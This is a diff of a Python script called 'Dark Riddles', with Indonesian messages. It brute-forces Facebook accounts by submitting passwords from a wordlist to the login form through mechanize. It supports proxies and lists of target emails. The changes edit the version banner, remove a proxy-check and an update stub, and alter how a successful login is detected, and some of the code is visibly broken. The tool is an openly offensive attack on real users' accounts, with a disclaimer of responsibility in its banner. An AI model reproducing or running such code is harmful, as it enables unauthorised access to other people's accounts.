@@ -38,7 +38,7 @@ def banner(target, wordlist, prxy, masal, emailo, port):
  |                 '''+putih+''' Dark Riddles  '''+orange+'''                 |
  <=================================================>
  | '''+putih+'''Authors: Sreetx'''+orange+'''                                |
- | '''+putih+'''Version: 5.1.73 #Beta'''+orange+'''                             |
+ | '''+putih+'''Version: 1.21.73 #Beta'''+orange+'''                           |
  +-------------------------------------------------+
  |'''+putih+'''[INFO]: KAMI TIDAK BERTANGGUNG JAWAB ATAS APAPUN'''+orange+''' |
  | '''+putih+'''YANG ANDA LAKUKAN'''+orange+'''                               |
@@ -84,13 +84,7 @@ def urg():
     br._factory.is_html = True
     br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
     br.addheaders = [('User-Agent', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1636.0 Safari/537.36')]
-def prs(prxy, port):
-    p = {'https':'http://'+str(prxy)+':'+str(port)}
-    try:
-        r = requests.get('https://www.wikipedia.org', proxies=p, timeout=5)
-        if prxyip==p.headers['X-Client-IP']: return True
-    except Exception: return False
-        
+
 def proxy(prxy, port):
     print(hijau+' [~] Menyambungkan ke proxy....'+putih)
     try:
@@ -99,12 +93,9 @@ def proxy(prxy, port):
             r = requests.get('https://www.wikipedia.org', proxies=p, timeout=5)
             if prxyip==p.headers['X-Client-IP']: return True
         except Exception: return False
-    except: print(merah+' [!] Tidak dapat tersambung'+putih);sys.exit()
+        print(hijau+' [/] Terhubung'+putih)
+    except: print(merah+' [!] Tidak dapat tersambung'+putih)
     
-def perbarui():
-    banner(target, wordlist, prxy, masal, emailo)
-    print('\a [~] Mengecek update....')
-    updt = requests.get('https://contentgithubuser.com')
 def logmasal(emailo, ps):
     email = (open(emailo).readlines())
     for im in email:
@@ -114,15 +105,13 @@ def logmasal(emailo, ps):
         proxymain(proxy)
 def login(target, p, prxy):
     urg()
-    if prxy:
-        prs(prxy, port)
     br.open('https://web.facebook.com/?_rdc=1&_rdr')
     br.select_form(nr=0)
     br.form['email'] = target
     br.form['pass'] = p.strip()
     br.method ='POST'
     so = br.submit().geturl()
-    if "https:/web.facebook.com/login/*" in so: return 3
+    if "recover" in so: return 2
     elif "checkpoint" in so:    
         print(orange+'\n \a\a<==================='+'='*len(p.strip())+'==>'+hijau)
         print(' [+] Kombinasi ditemukan!')
@@ -200,7 +189,6 @@ if wordlist:
     except: print(merah+' [!] Harap periksa koneksi internet anda\n'+putih);sys.exit()
     if prxy:
         proxy(prxy, port)
-        print(hijau+" [✓] Tersambung\n"+putih)
     try:
         l = len(list(open(wordlist, 'rb')))
     except: 
